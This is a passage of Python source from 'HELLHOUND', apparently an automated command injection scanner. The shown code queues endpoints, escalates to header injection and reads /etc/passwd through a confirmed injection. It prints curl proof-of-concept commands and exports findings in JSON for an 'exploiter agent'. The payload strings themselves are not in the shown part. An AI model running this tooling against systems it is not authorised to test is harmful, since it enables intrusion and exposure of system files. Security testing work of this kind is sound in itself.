                        if _lr["status"] in (0, 404, 410):
                            continue
                        _lm = "POST"
                    else:
                        _lm = "GET"
                    _lbody = _lr.get("body", "")
                    _lct   = _lr.get("headers", {}).get("content-type", "").lower()
                    _lparams = {}
                    _ljp = []
                    if _lbody and ("json" in _lct or _lbody.lstrip().startswith(("{", "["))):
                        _ljp = list(Crawler._extract_json_params(_lbody))
                        for _p in _ljp:
                            _lparams[_p] = "test"
                    if not _lparams:
                        _lpath = urllib.parse.urlparse(_lfull).path
                        for _h in Crawler._path_to_params(_lpath):
                            _lparams[_h] = "test"
                    if not _lparams:
                        _lparams = {"q": "test", "input": "test"}
                    _lsig = Crawler._response_sig(_lbody) if _lbody else None
                    _late_ep = {
                        "url":            _lfull,
                        "method":         _lm,
                        "params":         _lparams,
                        "hidden":         {},
                        "source":         "late_response",
                        "confirmed":      False,
                        "priority_params": _ljp,
                        "response_sig":   _lsig,
                        "discovered_via": ep["url"],
                    }
                    normal_queue.appendleft(_late_ep)
                    total += 1
                    _newly_queued += 1
                except Exception:
                    pass
            if _newly_queued:
                _via_url = ep.get("url", "?")
                tprint(f"  {ok(f'Late-discovered {_newly_queued} new endpoint(s) from response body → inserted at front of queue')}")

        # Pass 2 — header injection (only if no findings yet from normal pass)
        # Rationale: if a site is already vulnerable via a normal param, the
        # header injection pass adds no new information and wastes time.
        # If the normal pass found nothing, headers are the next logical surface.
        if header_eps:
            if not self.findings:
                vdim("Normal pass: no findings — proceeding to header injection pass")
                tprint(f"  {info('No param-level findings — escalating to header injection surface')}")
                for ep in header_eps:
                    done += 1
                    self.test_endpoint(ep, done, total)
                    pct = int(done / total * 100)
                    sys.stdout.write(f"\r  {color(f'  testing {done}/{total} ({pct}%)', C.DIM)}  ")
                    sys.stdout.flush()
            else:
                vdim(f"Normal pass found {len(self.findings)} finding(s) — header injection pass skipped")

        # ── Phase B: file read ─────────────────────────────────────────────
        # Runs once after ALL injection testing is complete.
        # Iterates findings in order; stops after first successful file read.
        # _do_file_read is called exactly once per scan (never inside test_endpoint).
        if self.findings and not self._file_read_done:
            sys.stdout.write("\r" + " " * 65 + "\r")
            for finding in self.findings:
                sep     = self._sep_from_finding(finding)
                blind   = finding["is_time_based"]
                wv      = finding.get("is_wv_mode", False)
                enc     = finding.get("param_enc", "none")
                endpoint = self._endpoint_for_finding(finding)
                if endpoint is None:
                    continue
                self._do_file_read(endpoint, finding["parameter"], sep,
                                   blind_context=blind, wv_mode=wv,
                                   input_encoding=enc)
                if self.file_reads:  # _do_file_read populates self.file_reads on success
                    self._file_read_done = True
                    break             # stop — never try another param

        # Shutdown self-hosted OOB listener after injection completes
        if hasattr(self, '_oob_server'):
            self._oob_server.stop()

        return self.findings

# ─────────────────────────────────────────────────────────────────────────────
# FINAL REPORT  (original — unchanged)
# ─────────────────────────────────────────────────────────────────────────────
def print_report(findings, file_reads, target_url, stats):
    section("FINAL REPORT")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    rows = [
        ("Target",            target_url),
        ("Completed",         ts),
        ("Pages crawled",     str(stats["pages"])),
        ("JS files analyzed", str(stats.get("js_files", 0))),
        ("SPA endpoints",     str(stats.get("spa_endpoints", 0))),
        ("Endpoints tested",  str(stats["endpoints"])),
        ("Parameters tested", str(stats["params"])),
        ("Scan token",        stats["token"]),
        ("OS detected",       stats["os"].upper()),
        ("Confirmed vulns",   str(len(findings))),
        ("Files read",        str(len(file_reads))),
    ]
    for k, v in rows:
        is_vuln_row = k == "Confirmed vulns"
        vc = (C.BRED if int(v) > 0 else C.BGREEN) if is_vuln_row and v.isdigit() else C.BWHITE
        bd = C.BOLD if is_vuln_row else ""
        k_colored = color(k + ":", C.BCYAN, C.BOLD)
        pad = max(0, 22 - len(k))
        print(f"  {k_colored}{' ' * pad} {color(v, vc, bd)}")

    if not findings:
        print(f"\n  {color('✓  No confirmed command injection vulnerabilities.', C.BGREEN, C.BOLD)}")
        print(f"  {color('   All suspicious patterns eliminated by multi-stage verification.', C.DIM)}")
        print(f"  {color('   Manual review is always recommended for full confidence.', C.DIM)}")
    else:
        section(f"FINDINGS  [{len(findings)} CONFIRMED]")
        for i, f in enumerate(findings, 1):
            inj_label = "time-blind" if f["is_time_based"] else "direct-output"
            if "no direct output" in f.get("evidence", "") and "Execution confirmation" in f.get("evidence", ""):
                inj_label = "blind:exec-confirm"
            if "[ADAPTIVE]" in f.get("description", ""):
                inj_label += " [adaptive-bypass]"
            poc = f.get("poc", {})
            ev  = f["evidence"][:100] + "…" if len(f["evidence"]) > 102 else f["evidence"]

            raw_pl    = f["payload"]
            dec_pl    = f.get("payload_decoded", raw_pl)
            is_wv     = f.get("is_wv_mode", False)
            wv_note   = "  [WV-replace mode]" if is_wv else ""

            print(f"\n  {color(f'#{i}', C.BRED, C.BOLD)}  {color(f['method'], C.BYELLOW)}  {color(f['endpoint'], C.BWHITE)}")
            print(f"  {color('  param   :', C.DIM)} {color(f['parameter'], C.BRED, C.BOLD)}  {color(f['param_risk'].upper(), C.BYELLOW)}")
            print(f"  {color('  payload :', C.DIM)} {color(raw_pl, C.BRED)}{color(wv_note, C.DIM)}")
            # Always show decoded line when payload is obfuscated
            if dec_pl != raw_pl:
                print(f"  {color('  decoded :', C.DIM)} {color(dec_pl, C.BYELLOW)}")
            print(f"  {color('  type    :', C.DIM)} {color(inj_label, C.BMAGENTA)}")
            print(f"  {color('  evidence:', C.DIM)} {color(ev, C.BGREEN)}")
            if poc.get("browser_url"):
                print(f"  {color('  browser :', C.DIM)} {color(poc['browser_url'], C.BCYAN)}")
            print(f"  {color('  curl    :', C.DIM)} {color(poc['curl_cmd'], C.BYELLOW)}")

        print(f"\n  {color('All findings VERIFIED — false positives filtered.', C.BWHITE)}")
        print(f"  {color('Fix: sanitize all user input before any shell execution.', C.DIM)}")

    # ── FILE READ PROOF ───────────────────────────────────────────────────────
    if file_reads:
        section("CRITICAL PROOF  —  FILE READ CONFIRMED")
        fr = file_reads[0]
        pl      = fr["payload"]
        strat   = fr.get("strategy", "A: direct output")

        print(f"  {color('★  ARBITRARY FILE READ ACHIEVED', C.BRED, C.BOLD)}")
        print()
        print(f"  {color('File    :', C.BCYAN, C.BOLD)} {color(fr['file'], C.BYELLOW, C.BOLD)}")
        print(f"  {color('Endpoint:', C.BCYAN, C.BOLD)} {color(fr['endpoint'], C.BWHITE)}")
        print(f"  {color('Param   :', C.BCYAN, C.BOLD)} {color(fr['param'], C.BRED, C.BOLD)}")
        print(f"  {color('Strategy:', C.BCYAN, C.BOLD)} {color(strat, C.BMAGENTA)}")
        pl_disp = pl if len(pl) <= 100 else pl[:97] + "…"
        print(f"  {color('Payload :', C.BCYAN, C.BOLD)} {color(pl_disp, C.DIM)}")
        print()

        bar_top    = color("  ╔" + "═" * 70 + "╗", C.DIM + C.CYAN)
        bar_bottom = color("  ╚" + "═" * 70 + "╝", C.DIM + C.CYAN)
        file_label = color(f"  ║  {fr['file']}  ", C.DIM + C.CYAN)
        print(bar_top)
        print(file_label)
        print(color("  ╠" + "═" * 70 + "╣", C.DIM + C.CYAN))

        raw = fr["content"]
        raw = re.sub(r"^\[base64-decoded\]\n?", "", raw.strip())
        # Unescape literal \n sequences that apps return inside JSON strings
        raw = raw.replace("\\n", "\n").replace("\\r", "")
        file_lines = [l for l in raw.split("\n") if l.strip()]

        for line in file_lines:
            display = line.strip()
            if len(display) > 68:
                display = display[:65] + "…"
            side = color("  ║  ", C.DIM + C.CYAN)
            print(f"{side}{color(display, C.BWHITE)}")

        print(bar_bottom)
        print()
        print(f"  {color(f'{len(file_lines)} lines read  —  full /etc/passwd (or equivalent) confirmed.', C.BGREEN, C.BOLD)}")
        print(f"  {color('Impact: remote code execution, credential exposure, privilege escalation.', C.BRED)}")

    print()
    print(color("  ─" * 36, C.DIM))
    print()

def export_json(findings, file_reads, target_url, stats, path):
    """
    Inst 12 — JSON export format for exploiter agent handoff.
    Findings emitted as a flat array.  Each finding contains all fields
    required for downstream exploitation without re-scanning:
      endpoint, method, parameter, param_location, payload, detection_method,
      os_type, shell_context, filter_fingerprint, privilege_context,
      baseline (time), evidence, severity, secondary_findings.
    """
    # Normalise each finding for the exploiter agent
    def _normalise(f):
        return {
            "endpoint":           f.get("endpoint"),
            "method":             f.get("method"),
            "parameter":          f.get("parameter"),
            "param_location":     f.get("param_location", "query"),
            "payload":            f.get("payload"),
            "payload_decoded":    f.get("payload_decoded"),
            "detection_method":   f.get("detection_method",
                                   "timing" if f.get("is_time_based") else "direct-output"),
            "os_type":            f.get("os_type"),
            "shell_context":      f.get("shell_context", "Linux shell"),
            "filter_fingerprint": f.get("filter_fingerprint"),
            "privilege_context":  f.get("privilege_context"),
            "severity":           f.get("severity", "confirmed"),
            "evidence":           f.get("evidence"),
            "baseline_time":      f.get("baseline"),
            "sink_hint":          f.get("sink_hint"),
            "secondary_findings": f.get("secondary_findings", []),
            "poc":                f.get("poc", {}),
            "confirmed_sep":      f.get("confirmed_sep"),
            "param_enc":          f.get("param_enc"),
            "source":             f.get("source"),
        }

    report = {
        "tool":    "HELLHOUND",
        "version": "5.19.0",
        "mode":    "autonomous_verified_spa_probe_adaptive_waf_decoded_blind_aware",
        "timestamp":       datetime.now().isoformat(),
        "target":          target_url,
        "stats":           stats,
        "findings_count":  len(findings),
        "findings":        [_normalise(f) for f in findings],
        "file_reads_count": len(file_reads),
        "file_reads":      file_reads,
    }
    with open(path, "w") as fh:
        json.dump(report, fh, indent=2)
    print(f"  {ok(f'JSON report → {path}')}")

# ─────────────────────────────────────────────────────────────────────────────
# MAIN  (original — unchanged)
# ─────────────────────────────────────────────────────────────────────────────

def _load_crawl_import(filepath):
    """
    Load endpoints from an Agent-2 crawl JSON file and normalize them into
    Hellhound's internal endpoint schema.

    Accepted input formats
    ──────────────────────
    A) Object with "endpoints" array (preferred):
       {
         "target": "http://...",          // optional — used to fill missing URL base
         "endpoints": [
           {
             "url":           "http://target/api/ping",   // required
             "method":        "POST",                      // optional, default GET
             "params":        {"host": "127.0.0.1"},       // optional
             "body":          "host=127.0.0.1",            // optional raw body
             "content_type":  "application/json",          // optional
             "headers":       {"X-Token": "abc"},          // optional
             "response_body": "{...}",                     // optional, chased for params
             "response_status": 200,                       // optional, 404 entries skipped
             "source":        "agent2_crawler",            // optional label
             "discovered_via": "/api/config"               // optional provenance
           }
         ]
       }

    B) Bare array:
       [ {"url": "...", "method": "GET", ...}, ... ]

    C) Flat object where keys are labels and values are URLs:
       { "api_ping": "/api/t5h1rn", "admin": "/a8r2tj" }
       Requires "target" key in the same object, or base URL is guessed.

    Returns
    ───────
    (target_url, endpoints_list)
      target_url     — str, base URL (from file or inferred from first entry)
      endpoints_list — list of normalized endpoint dicts ready for Hellhound
    """
    import json as _json
    import urllib.parse as _up

    try:
        with open(filepath, encoding="utf-8") as _f:
            raw = _json.load(_f)
    except FileNotFoundError:
        print(f"  {err(f'--spider: file not found: {filepath}')}")
        raise RuntimeError("Fatal error")
    except _json.JSONDecodeError as _e:
        print(f"  {err(f'--spider: JSON parse error: {_e}')}")
        raise RuntimeError("Fatal error")

    target_url = None
    raw_entries = []

    if isinstance(raw, list):
        # Format B — bare array
        raw_entries = raw

    elif isinstance(raw, dict):
        target_url = raw.get("target") or raw.get("base_url") or raw.get("url")
        entries = raw.get("endpoints") or raw.get("urls") or raw.get("results")

        if entries and isinstance(entries, list):
            # Format A — preferred
            raw_entries = entries
        else:
            # Format C — flat {label: path} dict
            # Collect only string values that look like paths or URLs
            for _k, _v in raw.items():
                if _k in ("target", "base_url", "url", "meta", "info", "version"):
                    continue
                if isinstance(_v, str) and (_v.startswith("/") or _v.startswith("http")):
                    raw_entries.append({"url": _v, "_label": _k})
                elif isinstance(_v, dict) and "url" in _v:
                    raw_entries.append(_v)

    if not raw_entries:
        print(f"  {err('--spider: no endpoints found in the JSON file.')}")
        print(f"  {info('Expected: {{"endpoints":[{{"url":"...","method":"GET",...}}]}} or a bare array.')}")
        raise RuntimeError("Fatal error")

    # ── Infer target from first absolute URL if not in file ──────────────────
    if not target_url:
        for _e in raw_entries:
            _u = _e.get("url", "")
            if _u.startswith("http"):
                _p = _up.urlparse(_u)
                target_url = f"{_p.scheme}://{_p.netloc}"
                break
    if not target_url:
        print(f"  {err('--spider: cannot determine target URL. Add "target": "http://..." to the JSON.')}")
        raise RuntimeError("Fatal error")

    # ── Normalize each entry into Hellhound endpoint schema ──────────────────
    _STATIC_EXT = re.compile(
        r"\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|pdf|zip|webp|bmp|tiff|avif)$", re.I)
    # Media/image path segments — skip these even without a file extension
    # e.g. /img/av/cr4ckm4p, /avatar/user123, /thumb/small/pic
    _MEDIA_PATH = re.compile(
        r"^/(?:img|image|images|avatar|avatars|media|thumb|thumbnails|"
        r"upload|uploads|cdn|files|public|res|resources|favicon|icons|"
        r"photo|photos|static|assets|fonts|dist|covers|banner|banners|"
        r"sprite|sprites|poster|posters|preview|previews)/", re.I)
    _HIGH_RISK_PARAMS = re.compile(
        r"^(?:cmd|command|exec|execute|run|shell|ping|host|hostname|ip|addr|address|"
        r"file|path|dir|folder|input|arg|argument|src|source|dest|target|"
        r"query|search|proc|process|debug|log|system)$", re.I)

    normalized = []
    seen_norm = {}  # (norm_url, method) → index in normalized, for merge

    for _raw_ep in raw_entries:
        if not isinstance(_raw_ep, dict):
            continue

        # ── URL ──────────────────────────────────────────────────────────────
        _url = (_raw_ep.get("url") or _raw_ep.get("endpoint") or
                _raw_ep.get("path") or "").strip()
        if not _url:
            continue
        # Resolve relative paths against target
        if not _url.startswith("http"):
            _url = _up.urljoin(target_url.rstrip("/") + "/", _url.lstrip("/"))
        # Skip static assets
        _ep_path = _up.urlparse(_url).path
        if _STATIC_EXT.search(_ep_path):
            continue
        # Skip media/image path prefixes even without file extensions
        # e.g. /img/av/cr4ckm4p, /avatar/user123, /thumbnails/pic
        if _MEDIA_PATH.search(_ep_path):
            continue
        # Skip obvious non-injection pages
        _skip_paths = re.compile(
            r"^/(logout|signout|favicon|robots\.txt|sitemap|"
            r"__pycache__|\.git|\.svn|node_modules)", re.I)
        if _skip_paths.search(_up.urlparse(_url).path):
            continue

        # ── Method ───────────────────────────────────────────────────────────
        # Agent 2 exports methods as a list: ["GET"] or ["GET", "POST"]
        # Take the first entry; fall back to GET.
        _raw_method = _raw_ep.get("method") or _raw_ep.get("methods") or "GET"
        if isinstance(_raw_method, list):
            _raw_method = _raw_method[0] if _raw_method else "GET"
        _method = str(_raw_method).upper().strip()
        if _method not in ("GET", "POST", "PUT", "PATCH", "DELETE"):
            _method = "GET"
        # Normalize PUT/PATCH/DELETE to POST for injection purposes
        if _method in ("PUT", "PATCH", "DELETE"):
            _method = "POST"

        # ── Skip 404/410 entries ─────────────────────────────────────────────
        # Agent 2 exports observed_status as a list: [200] or [404]
        # Extract first numeric status; also check baseline.status.
        _raw_status = (_raw_ep.get("observed_status") or
                       _raw_ep.get("response_status") or
                       _raw_ep.get("status_code") or [])
        if isinstance(_raw_status, list):
            _raw_status = _raw_status[0] if _raw_status else 0
        _status = int(_raw_status) if _raw_status else 0
        # Also check baseline.status
        _baseline = _raw_ep.get("baseline") or {}
        if not _status and isinstance(_baseline, dict):
            _status = int(_baseline.get("status") or 0)
        if _status in (404, 410, 400):
            continue

        # ── Source → flat string ─────────────────────────────────────────────
        # Agent 2 exports source as a list: ["Robots_Disallow", "JSON_Path"]
        # Collapse to a single string for all downstream string operations.
        # Map known Agent 2 labels to Hellhound source names where possible,
        # then join remainder for display.
        _raw_src = _raw_ep.get("source") or "agent2_crawl"
        if isinstance(_raw_src, list):
            # Map Agent 2 source labels → Hellhound equivalents
            _SRC_MAP = {
                "JS_Analysis":         "js:inline",
                "JSON_Response":       "chained_path_d1",
                "JSON_Path":           "chained_path_d1",
                "Robots_Disallow":     "discovery_file",
                "Form":                "form@import",
                "HTML(Form_Action)":   "form@import",
                "HTML(HTML_Link)":     "chained_path_d2",
                "HTML(Robots_Disallow)": "discovery_file",
                "HTML(Seed)":          "path_probe",
            }
            # Priority: pick the highest-value mapped source
            _SRC_PRIORITY = {
                "chained_path_d1": 5, "js:inline": 4,
                "discovery_file": 3,  "chained_path_d2": 2,
                "form@import": 1,     "path_probe": 0,
            }
            _mapped = [_SRC_MAP.get(s, "agent2_crawl") for s in _raw_src]
            _source = max(_mapped, key=lambda s: _SRC_PRIORITY.get(s, -1))
        else:
            _source = str(_raw_src) if _raw_src else "agent2_crawl"

        # ── Confidence → priority boost ──────────────────────────────────────
        # Agent 2 confidence_label: CONFIRMED(10) HIGH(7-9) MEDIUM(3-6) LOW(1-2)
        # parameter_sensitive = Agent 2 already flagged this as having active params
        _confidence     = int(_raw_ep.get("confidence") or 0)
        _param_sensitive = bool(_raw_ep.get("parameter_sensitive") or False)

        # ── Params ───────────────────────────────────────────────────────────
        params: dict = {}
        priority_params: list = []

        # 1. Explicit params field
        # Agent 2 schema: {"query": ["q","page"], "form": ["user","pass"],
        #                  "js": [], "openapi": [], "runtime": []}
        # Each bucket is a LIST of param name strings (not key:value pairs).
        _ep_params = _raw_ep.get("params") or _raw_ep.get("parameters") or {}
        if isinstance(_ep_params, dict):
            # Check if values are lists of param names (Agent 2 format)
            # vs a flat {name: value} dict (generic format)
            _is_bucketed = all(isinstance(v, list) for v in _ep_params.values())
            if _is_bucketed:
                # Agent 2 bucketed format — flatten all buckets, treat names as params
                # Bucket priority: runtime > openapi > js > form > query (most to least dynamic)
                _BUCKET_ORDER = ["runtime", "openapi", "js", "form", "query"]
                for _bucket in _BUCKET_ORDER:
                    for _pname in (_ep_params.get(_bucket) or []):
                        _pk = str(_pname).strip()
                        if _pk and _pk not in params:
                            params[_pk] = "test"
                            if _HIGH_RISK_PARAMS.match(_pk):
                                priority_params.append(_pk)
                # Also accept any extra buckets not in the standard list
                for _bucket, _plist in _ep_params.items():
                    if _bucket not in _BUCKET_ORDER and isinstance(_plist, list):
                        for _pname in _plist:
                            _pk = str(_pname).strip()
                            if _pk and _pk not in params:
                                params[_pk] = "test"
                                if _HIGH_RISK_PARAMS.match(_pk):
                                    priority_params.append(_pk)
            else:
                # Flat {name: value} dict (generic crawler format)
                for _pk, _pv in _ep_params.items():
                    params[str(_pk)] = str(_pv) if _pv is not None else "test"
                    if _HIGH_RISK_PARAMS.match(str(_pk)):
                        priority_params.append(str(_pk))
        elif isinstance(_ep_params, list):
            # Some crawlers: [{name:..., value:...}] or ["param1", "param2"]
            for _item in _ep_params:
                if isinstance(_item, dict):
                    _pk = str(_item.get("name") or _item.get("key") or "")
                    _pv = str(_item.get("value") or _item.get("default") or "test")
                    if _pk:
                        params[_pk] = _pv
                        if _HIGH_RISK_PARAMS.match(_pk):
                            priority_params.append(_pk)
                elif isinstance(_item, str) and _item.strip():
                    _pk = _item.strip()
                    params[_pk] = "test"
                    if _HIGH_RISK_PARAMS.match(_pk):
                        priority_params.append(_pk)

        # 2. Query string params from URL itself
        _parsed_url = _up.urlparse(_url)
        _qs = _up.parse_qs(_parsed_url.query, keep_blank_values=True)
        for _pk, _pv_list in _qs.items():
            if _pk not in params:
                params[_pk] = _pv_list[0] if _pv_list else "test"
                if _HIGH_RISK_PARAMS.match(_pk):
                    priority_params.append(_pk)
        # Clean URL — strip query string (params extracted above)
        _url_clean = _up.urlunparse(_parsed_url._replace(query="", fragment=""))

        # 3. Body fields (POST form or JSON body)
        _body_raw = _raw_ep.get("body") or _raw_ep.get("request_body") or ""
        _ct = (_raw_ep.get("content_type") or
               (_raw_ep.get("headers") or {}).get("Content-Type", "") or
               (_raw_ep.get("headers") or {}).get("content-type", "")).lower()
        if _body_raw:
            if "json" in _ct or (isinstance(_body_raw, str)
                                  and _body_raw.lstrip().startswith(("{", "["))):
                try:
                    import json as _bj
                    _bd = _bj.loads(_body_raw) if isinstance(_body_raw, str) else _body_raw
                    if isinstance(_bd, dict):
                        for _pk, _pv in _bd.items():
                            if _pk not in params:
                                params[str(_pk)] = str(_pv) if _pv is not None else "test"
                                if _HIGH_RISK_PARAMS.match(str(_pk)):
                                    priority_params.append(str(_pk))
                except Exception:
                    pass
            else:
                # URL-encoded or raw form body
                for _pk, _pv_list in _up.parse_qs(
                        _body_raw if isinstance(_body_raw, str) else "",
                        keep_blank_values=True).items():
                    if _pk not in params:
                        params[_pk] = _pv_list[0] if _pv_list else "test"
                        if _HIGH_RISK_PARAMS.match(_pk):
                            priority_params.append(_pk)

        # 4. Chase response_body for additional high-risk param names
        _resp_body = (_raw_ep.get("response_body") or
                      _raw_ep.get("response") or
                      _raw_ep.get("body_response") or "")
        _resp_sig = None
        if _resp_body and isinstance(_resp_body, str):
            _resp_sig = Crawler._response_sig(_resp_body)
            # Extract JSON key-based param hints from response
            try:
                import json as _rj
                _rd = _rj.loads(_resp_body)
                _HR_KEYS = re.compile(
                    r"^(?:cmd|command|exec|execute|run|shell|ping|host|hostname|"
                    r"ip|addr|address|file|path|dir|folder|input|arg|argument|"
                    r"src|source|dest|target|query|search|proc|process|"
                    r"output|debug|log|system)$", re.I)
                def _walk_resp(node):
                    if isinstance(node, dict):
                        for _rk, _rv in node.items():
                            if _HR_KEYS.match(str(_rk)) and str(_rk) not in params:
                                params[str(_rk)] = "test"
                                priority_params.append(str(_rk))
                            _walk_resp(_rv)
                    elif isinstance(node, list):
                        for _ri in node:
                            _walk_resp(_ri)
                _walk_resp(_rd)
            except Exception:
                pass

        # Mark whether any REAL params were found (from agent2 data, not guessed)
        _real_params_found = bool(params)  # True if steps 1-4 populated anything

        # 5. Fallback: path-hint params if nothing found
        if not params:
            _path_segs = [s for s in _parsed_url.path.split("/") if s]
            _HINT_MAP = {
                "ping": ["host", "target", "ip"],
                "exec": ["cmd", "command", "input"],
                "run":  ["cmd", "command", "input"],
                "cmd":  ["cmd", "command"],
                "search": ["q", "query", "input"],
                "query": ["q", "query"],
                "file": ["file", "path", "name"],
                "upload": ["file", "path"],
                "log":  ["file", "path", "level"],
                "debug": ["cmd", "input", "q"],
                "export": ["file", "path", "format"],
                "import": ["file", "path"],
                "preview": ["url", "path", "src"],
                "proxy": ["url", "target", "host"],
                "scan":  ["host", "target", "ip"],
                "check": ["host", "target", "url"],
                "admin": ["cmd", "input", "action"],
            }
            for _seg in _path_segs:
                _seg_l = _seg.lower()
                if _seg_l in _HINT_MAP:
                    for _h in _HINT_MAP[_seg_l]:
                        if _h not in params:
                            params[_h] = "test"
                            if _HIGH_RISK_PARAMS.match(_h):
                                priority_params.append(_h)
            if not params:
                params = {"q": "test", "input": "test", "cmd": "test"}

        # ── Hidden fields (form hidden inputs) ───────────────────────────────
        _hidden = {}
        _hidden_raw = _raw_ep.get("hidden") or _raw_ep.get("hidden_params") or {}
        if isinstance(_hidden_raw, dict):
            _hidden = {str(k): str(v) for k, v in _hidden_raw.items()}

        # ── response_sig: prefer baseline.hash from Agent 2 over computed sig ──
        # Agent 2 already fetched the endpoint and stored the response hash.
        # Use it directly — no need for response_body to be present.
        _baseline_hash = None
        if isinstance(_baseline, dict):
            _baseline_hash = _baseline.get("hash") or None
        _final_resp_sig = _baseline_hash or _resp_sig

        # ── Boost priority_params for parameter_sensitive endpoints ─────────
        # Agent 2 marks parameter_sensitive=True when it confirmed active params.
        # Add all params as priority_params so they are tested first.
        if _param_sensitive and params:
            for _pk in params:
                if _pk not in priority_params:
                    priority_params.append(_pk)

        # ── Build normalized entry ────────────────────────────────────────────
        _ep = {
            "url":            _url_clean,
            "method":         _method,
            "params":         params,
            "hidden":         _hidden,
            "source":         _source,          # already a string, mapped from Agent 2 labels
            "priority_params": list(dict.fromkeys(priority_params)),  # dedup preserve order
            "response_sig":   _final_resp_sig,
            "discovered_via": _raw_ep.get("discovered_via") or _raw_ep.get("found_at") or None,
            "confidence":     _confidence,       # Agent 2 confidence score (0-10)
            "_real_params":   _real_params_found, # True = params from agent2 data
        }

        # ── Dedup: same normalized URL + method → merge ───────────────────────
        _nk = (Crawler._norm_url(_url_clean), _method)
        if _nk in seen_norm:
            _ex = normalized[seen_norm[_nk]]
            for _pk, _pv in params.items():
                _ex["params"].setdefault(_pk, _pv)
            for _pk in priority_params:
                if _pk not in _ex["priority_params"]:
                    _ex["priority_params"].append(_pk)
            if _resp_sig and not _ex.get("response_sig"):
                _ex["response_sig"] = _resp_sig
        else:
            seen_norm[_nk] = len(normalized)
            normalized.append(_ep)

    if not normalized:
        print(f"  {err('--spider: all entries were filtered out (404s, static assets, no valid URLs).')}")
        raise RuntimeError("Fatal error")

    return target_url, normalized




# ══════════════════════════════════════════════════════════════════════
# SPIDER INTEL → ENDPOINT CONVERSION
# Converts Hellhound Spider intel dict into CMDinj endpoint format.
# ══════════════════════════════════════════════════════════════════════

_STRIP_SFX  = re.compile(r'^(.+?)(?:_raw|_sanitized|_input|_clean|_safe|_encoded|_value)$', re.I)
_AUTH_RE    = re.compile(r'(?:password|passwd|pass|token|csrf|secret|auth)', re.I)
_STATIC_EXT = re.compile(r'\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|pdf|zip|webp|mp4|mp3)$', re.I)
_BUCKET_ORDER    = ["runtime", "query", "openapi", "js", "form"]
_PRIORITY_BUCKETS = {"runtime", "query"}

def _strip_sfx(name):
    m = _STRIP_SFX.match(str(name).strip())
    return m.group(1) if m else str(name).strip()

def _spider_intel_to_endpoints(intel, target):
    """
    Convert Spider intel dict → list of CMDinj endpoint dicts.
    Preserves bucketed params, priority ordering, auth-param separation.
    """
    entries  = intel.get("endpoints", [])
    base_url = target.rstrip("/")
    endpoints = []

    for entry in entries:
        if not isinstance(entry, dict):
            continue

        ep_url = entry.get("url", "").strip()
        if not ep_url:
            continue
        if not ep_url.startswith("http"):
            ep_url = urllib.parse.urljoin(base_url + "/", ep_url.lstrip("/"))

        # Skip static assets
        parsed_path = urllib.parse.urlparse(ep_url).path
        if _STATIC_EXT.search(parsed_path):
            continue

        # Method
        methods = entry.get("methods") or entry.get("method") or ["GET"]
        if isinstance(methods, str):
            methods = [methods]
        method = str(methods[0]).upper() if methods else "GET"
        if method not in ("GET", "POST", "PUT", "PATCH", "DELETE"):
            method = "GET"
        if method in ("PUT", "PATCH", "DELETE"):
            method = "POST"

        # Skip definitively dead endpoints
        # Spider v12 stores observed_status as a list e.g. [200] or [404, 200].
        # Normalise to a single int before comparison.
        obs = entry.get("observed_status") or 0
        if isinstance(obs, list):
            obs = obs[0] if obs else 0
        baseline = entry.get("baseline") or {}
        if not obs and isinstance(baseline, dict):
            raw_bs = baseline.get("status") or 0
            if isinstance(raw_bs, list):
                raw_bs = raw_bs[0] if raw_bs else 0
            obs = raw_bs
        try:
            obs_int = int(obs or 0)
        except (TypeError, ValueError):
            obs_int = 0
        if obs_int in (404, 410, 400):
            continue

        # Params
        raw_params      = entry.get("params") or {}
        params          = {}
        priority_params = []
        auth_params     = []

        if isinstance(raw_params, dict):
            is_bucketed = all(isinstance(v, list) for v in raw_params.values())
            if is_bucketed:
                for bucket in _BUCKET_ORDER:
                    for pname in (raw_params.get(bucket) or []):
                        pk = _strip_sfx(pname)
                        if not pk:
                            continue
                        if _AUTH_RE.search(pk) and bucket == "form":
                            auth_params.append(pk)
                            continue
                        if pk not in params:
                            params[pk] = "test"
                        if bucket in _PRIORITY_BUCKETS and pk not in priority_params:
                            priority_params.append(pk)
            else:
                for pk, pv in raw_params.items():
                    pk = _strip_sfx(pk)
                    if not pk or _AUTH_RE.search(pk):
                        continue
                    params[pk] = str(pv) if pv else "test"
        elif isinstance(raw_params, list):
            for item in raw_params:
                pk = _strip_sfx(str(item))
                if pk and pk not in params:
                    params[pk] = "test"

        # QS fallback
        qs = urllib.parse.parse_qs(urllib.parse.urlparse(ep_url).query, keep_blank_values=True)
        for pk, pvlist in qs.items():
            pk = _strip_sfx(pk)
            if pk and pk not in params:
                params[pk] = pvlist[0] if pvlist else "test"
                if pk not in priority_params:
                    priority_params.append(pk)
        clean_url = urllib.parse.urlunparse(
            urllib.parse.urlparse(ep_url)._replace(query="", fragment=""))

        # Path hint fallback
        if not params:
            for ph in Crawler._path_to_params(urllib.parse.urlparse(ep_url).path):
                params[ph] = "test"
        if not params:
            params = {"q": "test", "input": "test", "cmd": "test"}

        endpoints.append({
            "url":               clean_url,
            "method":            method,
            "params":            params,
            "hidden":            {},
            "source":            "spider_intel",
            "priority_params":   list(dict.fromkeys(priority_params)),
            "auth_params":       auth_params,
            "confirmed":         bool(priority_params),
            "parameter_sensitive": bool(entry.get("parameter_sensitive")),
            "response_sig":      baseline.get("hash") if isinstance(baseline, dict) else None,
            "discovered_via":    entry.get("discovered_via") or None,
        })

    return endpoints


# ══════════════════════════════════════════════════════════════════════
# FRAMEWORK ENTRY POINT
# ══════════════════════════════════════════════════════════════════════

def run(target, emit, options=None, stop_check=None, pause_check=None):
    """
    Hellhound module entry point.

    options keys (all optional — see OPTIONS list):
      cookie         : session cookie / auth token
      timeout        : HTTP timeout (default 15)
      time_thresh    : time-blind threshold seconds (default 9.0)
      force_os       : "linux" or "windows"
      collab         : OOB collaborator URL
      delay          : inter-request delay
      verbose        : show payload-level detail
      proxy          : HTTP proxy URL
      output_dir     : web dir for Tier 3 redirect payloads
      read_path      : URL path to read redirect output
      header         : extra request header "Key: Value"
      login_url/user/pass : pre-scan form authentication
      spider_intel   : auto-injected by console when Spider has run

    Returns:
      {"raw": str, "intel": dict}
    """
    opts    = options or {}
    global VERBOSE
    VERBOSE = bool(opts.get("verbose", False))

    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    emit.section("Command Injection Scanner")
    token = make_token()
    emit.info(f"Scan token: {token}")

    # ── Build HTTP client ──────────────────────────────────────────────
